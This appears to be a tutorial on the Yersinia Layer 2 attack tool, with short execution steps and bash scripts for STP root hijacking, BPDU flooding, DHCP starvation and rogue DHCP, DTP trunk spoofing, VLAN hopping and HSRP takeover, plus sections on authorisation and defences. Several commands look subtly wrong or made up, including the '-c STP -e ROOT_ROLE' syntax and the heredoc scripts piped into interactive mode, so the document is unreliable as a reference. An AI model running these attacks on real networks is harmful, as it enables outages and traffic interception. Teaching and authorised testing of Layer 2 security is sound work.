# YERSINIA: A Comprehensive Guide to Layer 2 Network Attack Simulation and Testing

## Table of Contents
1. [Introduction](#introduction)
2. [Layer 2 Protocol Fundamentals](#layer-2-protocol-fundamentals)
3. [How YERSINIA Works](#how-yersinia-works)
4. [Installation and Setup](#installation-and-setup)
5. [Interface Modes](#interface-modes)
6. [Supported Protocols](#supported-protocols)
7. [STP (Spanning Tree Protocol) Attacks](#stp-spanning-tree-protocol-attacks)
8. [DHCP Attacks](#dhcp-attacks)
9. [CDP (Cisco Discovery Protocol) Attacks](#cdp-cisco-discovery-protocol-attacks)
10. [DTP (Dynamic Trunking Protocol) Attacks](#dtp-dynamic-trunking-protocol-attacks)
11. [802.1Q VLAN Attacks](#8021q-vlan-attacks)
12. [HSRP (Hot Standby Router Protocol) Attacks](#hsrp-hot-standby-router-protocol-attacks)
13. [Practical Examples and Workflows](#practical-examples-and-workflows)
14. [Security and Ethical Considerations](#security-and-ethical-considerations)

---

## Introduction

**Yersinia** is a network penetration testing tool specifically designed for Layer 2 (Data Link Layer) attack simulation and protocol testing. Named after Yersinia pestis (the bacteria that causes the plague), it focuses on exploiting vulnerabilities in network protocols including STP, DHCP, CDP, DTP, HSRP, and 802.1Q VLAN implementations. Yersinia allows security professionals to test network resilience and identify misconfigurations in switched networks.

### Key Characteristics

- **Layer 2 Focused**: Operates at the Data Link Layer (switching layer)
- **Multiple Protocols**: Supports 6+ network protocols
- **GUI Interface**: GTK graphical user interface (-G flag)
- **Interactive Console**: ncurses-based text interface (-I flag)
- **Daemon Mode**: Remote administration capability (-D flag)
- **Packet Crafting**: Create custom layer 2 packets
- **Attack Simulation**: Realistic network attack scenarios
- **Network Testing**: Identify protocol weaknesses
- **Cisco CLI Emulation**: Familiar command syntax
- **Protocol Dissection**: Real-time packet analysis

### Primary Use Cases

- **Penetration Testing**: Test layer 2 security
- **Switch Security Assessment**: Verify switch hardening
- **Protocol Vulnerability Testing**: Identify exploitable weaknesses
- **Network Topology Manipulation**: Test STP stability
- **VLAN Security Testing**: Test VLAN isolation
- **DHCP Security Testing**: Test DHCP protection
- **Red Team Exercises**: Realistic layer 2 attacks
- **Security Training**: Educational network testing
- **Defense Validation**: Test detection capabilities

### Limitations

- **Layer 2 Only**: Cannot attack higher layers directly
- **Local Network**: Requires LAN access (broadcast range)
- **Easily Detected**: Generates obvious attack patterns
- **Root Required**: Needs elevated privileges
- **Noisy**: Generates significant network traffic
- **Network Disruption**: Can cause network outages if misused
- **GTK Issues**: GUI can have compatibility issues

---

## Layer 2 Protocol Fundamentals

### OSI Model Focus

```
┌─────────────────────────────────────┐
│ Layer 7: Application                │
├─────────────────────────────────────┤
│ Layer 6: Presentation               │
├─────────────────────────────────────┤
│ Layer 5: Session                    │
├─────────────────────────────────────┤
│ Layer 4: Transport                  │
├─────────────────────────────────────┤
│ Layer 3: Network                    │
├─────────────────────────────────────┤
│ Layer 2: DATA LINK (Yersinia Focus) │  ← Yersinia operates here
│ ├─ Switching                        │
│ ├─ MAC Address                      │
│ ├─ Frame Forwarding                 │
│ └─ VLAN Management                  │
├─────────────────────────────────────┤
│ Layer 1: Physical                   │
└─────────────────────────────────────┘
```

### Protocols and Port Numbers

```
STP (Spanning Tree Protocol)
├─ Purpose: Prevent network loops
├─ BPDU Port: 01:80:C2:00:00:00
└─ Used for: Network redundancy

DHCP (Dynamic Host Configuration Protocol)
├─ Ports: 67 (Server), 68 (Client)
├─ Purpose: Automatic IP assignment
└─ Vulnerable to: Starvation, rogue servers

CDP (Cisco Discovery Protocol)
├─ Purpose: Discover Cisco devices
├─ Multicast: 01:00:0C:CC:CC:CC
└─ Used for: Device inventory

DTP (Dynamic Trunking Protocol)
├─ Purpose: Negotiate trunk links
├─ VLAN: Proprietary Cisco protocol
└─ Used for: Trunk configuration

802.1Q (VLAN Tagging)
├─ Purpose: Virtual LAN separation
├─ Priority: 0-7 (0=lowest, 7=highest)
└─ Used for: Network segmentation

HSRP (Hot Standby Router Protocol)
├─ Purpose: Router redundancy
├─ Multicast: 224.0.0.102:1985
└─ Used for: Default gateway failover
```

---

## How YERSINIA Works

### Operational Model

```
┌────────────────────────────┐
│ User Selects Interface     │
│ (GUI or CLI)               │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Choose Network Interface   │
│ (eth0, wlan0, etc.)        │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Select Protocol            │
│ (STP, DHCP, CDP, etc.)     │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Select Attack Type         │
│ (Root hijack, DOS, flood)  │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Craft Malicious Packets    │
│ (BPDUs, DHCP offers, etc.) │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Send Packets to Network    │
│ (Broadcast or unicast)     │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Monitor Network Response   │
│ (Topology changes, etc.)   │
└────────────┬───────────────┘
             │
             ▼
┌────────────────────────────┐
│ Display Results/Status     │
│ (Compromised, Failed, etc.)│
└────────────────────────────┘
```

### Attack Generation Process

```
Yersinia Packet Crafting:

1. SET PARAMETERS
   └─ Configure attack parameters
      ├─ Bridge ID (for STP)
      ├─ Server MAC (for DHCP)
      └─ Gateway address (for HSRP)

2. GENERATE PAYLOAD
   └─ Create protocol-specific payload
      ├─ Spanning Tree BPDU
      ├─ DHCP Offer/Discover
      ├─ CDP Advertisement
      └─ DTP Frame

3. CREATE ETHERNET FRAME
   └─ Wrap payload in Ethernet frame
      ├─ Source MAC
      ├─ Destination MAC
      └─ EtherType

4. SEND PACKET
   └─ Transmit via raw socket
      ├─ Direct to network interface
      └─ Often broadcast to all devices

5. REPEAT
   └─ Send periodically or continuously
      ├─ Every 2 seconds (typical for STP)
      └─ Rapid fire (for DoS attacks)
```

---

## Installation and Setup

### Linux Installation

**Kali Linux** (Pre-installed):

```bash
sudo yersinia -h
```

**Ubuntu/Debian**:

```bash
sudo apt update
sudo apt install yersinia
```

**Fedora/RHEL**:

```bash
sudo dnf install yersinia
```

**Arch Linux**:

```bash
sudo pacman -S yersinia
```

### From Source

```bash
git clone https://github.com/tomac/yersinia.git
cd yersinia

# Install dependencies first
sudo apt install libnet1-dev libpcap0.8-dev libgtk-3-dev

# Configure and build
./configure
make
sudo make install
```

### Verification

```bash
# Check installation
which yersinia

# Check version
yersinia --version

# Display help
yersinia -h
```

### Troubleshooting GTK Support

```bash
# If GUI doesn't work, rebuild with GTK support
./configure --enable-gtk
make
sudo make install

# Verify GTK support
yersinia -G
```

---

## Interface Modes

### 1. Graphical User Interface (GTK)

```bash
# Launch GUI
sudo yersinia -G
```

**Features**:
- Menu-driven interface
- Visual topology display
- Real-time packet viewing
- Point-and-click attacks

**Controls**:
```
F1/h     = Help
F2       = Change protocol
i        = Select interface
g        = List/select attacks
x        = Execute attack
1-9      = Select attack parameter
q        = Quit
```

### 2. Interactive Console (ncurses)

```bash
# Launch interactive mode
sudo yersinia -I
```

**Features**:
- Text-based interface
- Lightweight
- Works over SSH
- Interactive command prompt

**Commands**:
```
help      = Show help
protocol  = Select protocol
attack    = Select attack type
start     = Start attack
stop      = Stop attack
quit      = Exit
```

### 3. Command-Line Mode (Non-interactive)

```bash
# Execute single attack
sudo yersinia -c PROTOCOL
```

**Features**:
- Script-friendly
- One-shot execution
- Batch processing
- Minimal output

### 4. Daemon Mode (Remote Admin)

```bash
# Start daemon
sudo yersinia -D

# Connect remotely
telnet localhost 54328

# Using Cisco CLI
device# enable
device# show version
```

---

## Supported Protocols

### Protocol List

| Protocol | Attack Type | Purpose |
|----------|-------------|---------|
| **STP** | Root Bridge Hijack, BPDU Flood | Topology manipulation |
| **DHCP** | Starvation, Rogue Server | IP exhaustion, fake server |
| **CDP** | Flooding, Fake devices | Device enumeration spoofing |
| **DTP** | Trunk negotiation | VLAN hopping |
| **802.1Q** | VLAN hopping, double tagging | Access other VLANs |
| **HSRP** | Become active router | Redirect traffic |
| **VTP** | Domain manipulation | VLAN configuration changes |

---

## STP (Spanning Tree Protocol) Attacks

### Attack 1: Root Bridge Hijack

**Goal**: Become the root bridge by claiming lower Bridge ID

**How it works**:

```
Normal STP Election:
Bridge ID = (Priority, MAC)
- Priority: 32768 (default)
- Lower BID wins

Attack:
1. Send BPDU with very low priority
2. Include attacker's MAC address
3. Repeat every 2 seconds
4. Network elects attacker as root
5. All traffic passes through attacker
```

**Impact**:
- Complete MITM capability
- Traffic monitoring
- Packet injection
- Network disruption

**Execution**:

```bash
# GUI mode
sudo yersinia -G
# Select STP protocol
# Select "Send BPDU - root role"
# Execute

# CLI mode
sudo yersinia -c STP -e ROOT_ROLE
```

### Attack 2: BPDU Denial of Service (DoS)

**Goal**: Flood network with BPDUs causing network storms

**How it works**:

```
1. Generate continuous BPDUs
2. Send to multicast address
3. Every switch recalculates
4. Network becomes unstable
5. Services degrade or fail
```

**Impact**:
- Network slowdown
- Disconnections
- Spanning tree recalculations
- Possible outage

**Execution**:

```bash
sudo yersinia -G
# Select STP
# Select "DoS - sending RAW BPDU"
# Configure attack parameters
# Start attack
```

### Attack 3: Topology Change Notification (TCN) Flood

**Goal**: Force continuous topology changes

**How it works**:

```
1. Send TCN packets
2. Switches age out MAC tables
3. Network inefficiency
4. Possible congestion
```

---

## DHCP Attacks

### Attack 1: DHCP Starvation

**Goal**: Exhaust DHCP pool of IP addresses

**How it works**:

```
1. Send many DHCP Discover packets
2. Use different MAC addresses (spoofed)
3. DHCP server assigns IPs
4. Pool depleted
5. Legitimate users can't get IP
```

**Impact**:
- Denial of service
- Legitimate hosts cannot connect
- Network unavailability

**Execution**:

```bash
sudo yersinia -G
# Select DHCP
# Select "Starvation attack"
# Configure number of requests
# Start attack
```

**Monitoring**:

```bash
# On DHCP server/router
show ip dhcp pool        # View pool
show ip dhcp binding     # View assigned IPs
# Watch pool become exhausted
```

### Attack 2: DHCP Rogue Server

**Goal**: Inject fake DHCP server responses

**How it works**:

```
1. Listen for DHCP Discover
2. Respond before legitimate server
3. Assign attacker-controlled IP
4. Assign attacker as default gateway
5. Attacker becomes MITM
```

**Impact**:
- Complete traffic interception
- DNS spoofing capability
- MITM attacks

**Execution**:

```bash
sudo yersinia -G
# Select DHCP
# Select "DHCP reply"
# Configure fake IP, gateway, DNS
# Listen for requests
```

---

## CDP (Cisco Discovery Protocol) Attacks

### Attack 1: CDP Flooding

**Goal**: Send many fake CDP advertisements

**How it works**:

```
1. Create fake CDP advertisements
2. Claim to be various Cisco devices
3. Send continuously
4. Network devices list fake neighbors
5. Network discovery contaminated
```

**Impact**:
- Network enumeration confusion
- Topology map poisoning
- Device inventory manipulation

**Execution**:

```bash
sudo yersinia -G
# Select CDP
# Select "Flooding"
# Configure fake device info
# Start attack
```

---

## DTP (Dynamic Trunking Protocol) Attacks

### Attack 1: Switch Spoofing

**Goal**: Negotiate trunk link to access all VLANs

**How it works**:

```
1. Send DTP frames claiming to be switch
2. Set desired mode to "desirable"
3. Target switch negotiates trunk
4. Attack machine becomes trunk port
5. Access to all VLANs on trunk
```

**Impact**:
- VLAN access
- Native VLAN untagged traffic
- Complete network access

**Execution**:

```bash
sudo yersinia -G
# Select DTP
# Select "Enable trunking"
# Configure trunking details
# Execute
# Switch port becomes trunk
```

---

## 802.1Q VLAN Attacks

### Attack 1: VLAN Hopping

**Goal**: Access VLANs through trunk exploitation

**Two Methods**:

**Method 1: Switch Spoofing (via DTP)**:
```
1. Negotiate trunk (see DTP above)
2. Access all native VLAN traffic
3. Send tagged frames
4. Access other VLANs
```

**Method 2: Double Tagging**:
```
1. Send frame with two 802.1Q tags
2. Outer tag = switch strips (attacker VLAN)
3. Inner tag = target VLAN
4. Frame reaches restricted VLAN
```

**Execution**:

```bash
sudo yersinia -G
# Select 802.1Q
# Select desired attack
# Configure source/target VLANs
# Execute
```

---

## HSRP (Hot Standby Router Protocol) Attacks

### Attack 1: Become Active Router

**Goal**: Hijack active router role and redirect traffic

**How it works**:

```
1. Send HSRP Hello packets
2. Claim higher priority than active router
3. Network elects attacker as active
4. Attacker is now default gateway
5. Complete MITM capability
```

**Impact**:
- Complete traffic interception
- DNS manipulation
- Credential capture

**Execution**:

```bash
sudo yersinia -G
# Select HSRP
# Select "Become active router"
# Configure priority (high value)
# Execute
```

---

## Practical Examples and Workflows

### Example 1: Basic STP Root Bridge Hijack

```bash
#!/bin/bash
# Simple root bridge hijack

# Start yersinia in interactive mode
sudo yersinia -I << 'EOF'
protocol stp
attack send_raw_bpdu_root
start
EOF

# Monitor switch topology change
# On switch: show spanning-tree brief
```

### Example 2: DHCP Starvation Attack

```bash
#!/bin/bash
# DHCP starvation in controlled environment

# Start DHCP starvation
sudo yersinia -I << 'EOF'
protocol dhcp
attack starvation
start
EOF

# Monitor DHCP pool depletion
# sudo tail -f /var/log/syslog
```

### Example 3: VLAN Hopping via DTP

```bash
#!/bin/bash
# Negotiate trunk for VLAN access

# Enable DTP trunking
sudo yersinia -I << 'EOF'
protocol dtp
attack enable_trunking
start
EOF

# Listen to all VLAN traffic
sudo tcpdump -i eth0 -n 'vlan'
```

### Example 4: Multi-Protocol Test

```bash
#!/bin/bash
# Test multiple protocol vulnerabilities

PROTOCOLS=("stp" "dhcp" "cdp" "dtp" "802.1q" "hsrp")

for protocol in "${PROTOCOLS[@]}"; do
    echo "[*] Testing $protocol"
    # Could enumerate and test each protocol
    # Provides comprehensive assessment
done
```

---

## Security and Ethical Considerations

### Legal Implications

**Yersinia Usage**:

- ✓ **Legal for authorized testing** (with written permission)
- ✓ **Permitted on own network** and test labs
- ✗ **Illegal without authorization** (network attack)
- ✗ **Can cause network outages** (DoS)
- ✗ **Privacy violations** through MITM attacks

### Responsible Use

1. **Get Written Authorization**: Signed approval for testing
2. **Test Environment**: Use isolated lab network
3. **Scheduled Testing**: Inform network staff
4. **Know Impact**: Understand potential disruptions
5. **Document Activity**: Keep detailed logs
6. **Restore State**: Return network to normal
7. **Professional Report**: Document findings

### Network Impact

**Potential Consequences**:

- **Network Outages**: STP/HSRP attacks can disrupt entire network
- **Service Disruption**: DHCP attacks prevent connectivity
- **Data Loss**: MITM attacks can capture sensitive data
- **Productivity Impact**: Users unable to work
- **Financial Loss**: Downtime costs
- **Compliance Issues**: Regulatory violations

### Defense Mechanisms

**STP Protection**:
```
- BPDU Guard: Block unexpected BPDUs
- Root Guard: Prevent root bridge hijacking
- Port security: Limit MAC addresses
- Enable RSTP (Rapid STP)
```

**DHCP Protection**:
```
- DHCP Snooping: Validate DHCP packets
- DAI (Dynamic ARP Inspection): Prevent spoofing
- Client Limit: Restrict DHCP requests
- Authorized servers: Whitelist DHCP servers
```

**VLAN Protection**:
```
- Disable unused ports
- Trunk only on configured ports
- Disable DTP (dynamic trunking)
- Enable port security
```

---

## Summary and Best Practices

### Key Capabilities

1. **Layer 2 Attack Simulation**: Craft custom attacks
2. **Protocol Exploitation**: Target specific weaknesses
3. **Network Testing**: Validate security controls
4. **Traffic Interception**: Become MITM
5. **Topology Manipulation**: Change network structure
6. **DoS Simulation**: Test resilience
7. **Multi-Protocol Support**: Various attack types

### When Yersinia is Useful

✓ **Appropriate Uses**:
- Authorized penetration testing
- Network security assessment
- Switch hardening validation
- Defense testing
- Security training/labs
- Red team exercises

✗ **Inappropriate Uses**:
- Unauthorized network attacks
- Causing network disruption
- Industrial espionage
- Criminal activity
- Unauthorized access

### Best Practices

1. **Get Authorization**: Signed approval required
2. **Use Isolated Lab**: Test in controlled environment
3. **Plan Carefully**: Understand each attack
4. **Monitor Impact**: Watch network behavior
5. **Document Activity**: Keep logs
6. **Restore Quickly**: Return network to normal
7. **Report Professional**: Document findings and recommendations

### Typical Security Assessment Workflow

```
1. Reconnaissance
   └─ Identify network topology and protocols

2. Planning
   └─ Select appropriate attacks to test

3. Testing
   └─ Execute attacks one at a time
   └─ Monitor network response
   └─ Document results

4. Analysis
   └─ Evaluate network resilience
   └─ Identify vulnerabilities
   └─ Assess impact

5. Reporting
   └─ Document all findings
   └─ Recommend improvements
   └─ Provide remediation guidance

6. Remediation
   └─ Implement fixes
   └─ Validate corrections
```

### Next Steps

- Master TCP/IP and network protocols
- Study switch architecture and STP
- Practice in isolated lab environments
- Learn complementary tools (ettercap, tcpdump)
- Get certified (CCNA, OSCP, CEH)
- Conduct authorized assessments
- Document all activities professionally
- Follow responsible disclosure practices
